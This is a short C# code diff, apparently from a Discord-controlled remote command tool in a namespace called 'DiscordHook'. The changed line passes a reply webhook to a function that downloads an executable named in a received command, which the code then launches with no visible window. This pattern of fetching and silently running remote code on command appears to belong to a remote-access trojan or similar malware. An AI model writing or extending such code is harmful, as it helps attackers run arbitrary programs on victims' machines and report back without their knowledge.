@@ -26,7 +26,7 @@ namespace DiscordHook
                             StartInfo =
                             {
                                 UseShellExecute = true,
-                                FileName = await DownloadExeAsync(command.Substring(6)),
+                                FileName = await DownloadExeAsync(command.Substring(6), replyhook),
                                 CreateNoWindow = true
                             }
                         };
